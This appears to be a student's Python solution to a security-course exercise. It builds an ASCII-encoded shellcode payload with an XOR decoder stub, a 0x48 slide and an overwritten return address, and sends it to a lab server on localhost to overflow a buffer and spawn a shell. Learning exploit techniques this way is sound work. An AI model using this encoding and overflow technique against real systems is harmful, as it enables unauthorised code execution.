import functools
import os
import socket
import traceback
import q2

from infosec.core import assemble, smoke
from typing import Tuple, Iterable


HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337


ASCII_MAX = 0x7f


def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)

    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(c > ASCII_MAX for c in selector(ret)):
                smoke.warning(f'Non ASCII chars in return value from '
                              f'{func.__name__} at '
                              f'{"".join(traceback.format_stack()[:-1])}')
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda result: result[0])
def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
    """Encode the given data to be valid ASCII.

    As we recommended in the exercise, the easiest way would be to XOR
    non-ASCII bytes with 0xff, and have this function return the encoded data
    and the indices that were XOR-ed.

    Tips:
    1. To return multiple values, do `return a, b`

    Args:
        data - The data to encode

    Returns:
        A tuple of [the encoded data, the indices that need decoding]
    """
    encoded_data = bytearray()
    indices_need_decoding = []
    xor_param = 0xff
       
    for i in range(len(data)):
        if (data[i] - ASCII_MAX > 0): # only non-ASCII byte
            encoded_data.append(data[i]^xor_param) # adding byte XOR-ed with 0xff
            indices_need_decoding.append(i) # index that was XOR-ed
            continue
        encoded_data.append(data[i]) # adding origin byte (ASCII byte)
    
    encoded_data = bytes(encoded_data) 
    return encoded_data, indices_need_decoding  

@warn_invalid_ascii()
def get_decoder_code(indices: Iterable[int]) -> bytes:
    """This function returns the machine code (bytes) of the decoder code.

    In this question, the "decoder code" should be the code which decodes the
    encoded shellcode so that we can properly execute it. Assume you already
    have the address of the shellcode, and all you need to do here is to do the
    decoding.

    Args:
        indices - The indices of the shellcode that need the decoding (as
        returned from `encode`)

    Returns:
         The decoder coder (assembled, as bytes)
    """
    
    xor_opcode = bytes([0x6a, 0x00, 0x5b, 0x4b, 0x30, 0x58]) # trick to get the wanted value into BL, and then XOR with BL
    decoder_coder = bytearray()
    xor_param = 0xff
    eax = 0
    
    for index in indices: # encodes to be valid ASCII by XOR-ing each non-ASCII byte
        while (index - eax - ASCII_MAX > 0): 
            decoder_coder += bytearray(ASCII_MAX * [0x48]) # "nop" slide
            eax = len(decoder_coder)
        decoder_coder += xor_opcode + bytes([index - eax])
    
    decoder_coder = bytes(decoder_coder)
    return decoder_coder


@warn_invalid_ascii()
def get_ascii_shellcode() -> bytes:
    """This function returns the machine code (bytes) of the shellcode.

    In this question, the "shellcode" should be the code which if we put EIP to
    point at, it will open the shell. Since we need this shellcode to be
    entirely valid ASCII, the "shellcode" is made of the following:

    - The instructions needed to find the address of the encoded shellcode
    - The encoded shellcode, which is just the shellcode from q2 after encoding
      it using the `encode()` function we defined above
    - The decoder code needed to extract the encoded shellcode

    As before, this does not include the size of the message sent to the server,
    the return address we override, the nop slide or anything else!

    Tips:
    1. This function is for your convenience, and will not be tested directly.
       Feel free to modify it's parameters as needed.
    2. Use the `assemble` module to translate any additional instructions into
       bytes.

    Returns:
         The bytes of the shellcode.
    """
    
    q2_shellcode = get_raw_shellcode() #  get the shellcode from question 2
    encoded_data, indices_need_decoding = encode(q2_shellcode) # encode it
    decoder_coder = get_decoder_code(indices_need_decoding) # decode it
    shell = bytes([0x54, 0x58] + [0x48] * (len(q2_shellcode))) + bytes([0x48,0x48,0x48,0x48]) + bytes(decoder_coder) + bytes(encoded_data) 
    # (1) figure out the start address from ESP, and then store the result in EAX: push ESP, pop EAX, (2) "nop" slide, (3) decoded, (4) encoded
    return shell


@warn_invalid_ascii(lambda payload: payload[4:-5])
def get_payload() -> bytes:
    """This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    # same as q2, the different is the nop slide (0x48 instead of 0x90) + ascii_shell
    ascii_shell = get_ascii_shellcode()
    msg_size = b'\x00\x00\x04\x14' # hex(1044) in big endian
    slide = bytearray(0x48 for i in range(1040-len(ascii_shell)))
    return_address = b'\xb4\xdc\xff\xbf' # 0xbfffe0b4 - 0x400 in little endian
    payload_bytes = msg_size + slide + ascii_shell + return_address  
    return payload_bytes


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
